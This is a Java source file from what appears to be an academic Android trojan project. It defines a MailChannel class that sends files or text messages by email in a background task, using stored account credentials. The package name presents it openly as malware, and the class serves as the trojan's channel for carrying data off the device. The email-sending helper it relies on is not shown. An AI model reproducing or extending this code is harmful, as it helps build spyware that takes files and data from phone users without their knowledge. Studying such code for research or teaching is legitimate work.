package il.ac.colman.androidtrojan.Channels.Mail;

import android.os.AsyncTask;
import il.ac.colman.androidtrojan.Channels.IFilesIncludedCommunication;

public class MailChannel extends AsyncTask implements IFilesIncludedCommunication {
	private MailSendTypes _type;
	final private String _username;
	final private String _password;
	private String _fileName;
	private String _filePath;
	private String _message;
	private MailSender _sender;

	// ctor:
	public MailChannel(MailSendTypes type, String username, String password,
			String fileName, String filePath, String message) {
		super();
		this._type = type;
		this._username = username;
		this._password = password;
		this._fileName = fileName;
		this._filePath = filePath;
		this._message = message;

		// creating the sender instance:
		this._sender = new MailSender(_username, _password);
	}

	@Override
	public void sendFile(String filePath, String fileName) throws Exception {
		// TODO Auto-generated method stub
		_sender.sendFile(filePath, fileName);
	}

	@Override
	public void sendString(String text) throws Exception {
		// TODO Auto-generated method stub
		_sender.sendString(text);
	}

	@Override
	protected Object doInBackground(Object... arg0) {
		// TODO Auto-generated method stub
		if (_type == MailSendTypes.File) {
			// checking that the varibles are not nulls:
			if (_filePath != null && _fileName != null)
				try {
					sendFile(_filePath, _fileName);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
		} else if (_type == MailSendTypes.String) {
			// checking that the varibles are not nulls:
			if (_message != null)
				try {
					sendString(_message);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
		}
		return null;
	}
}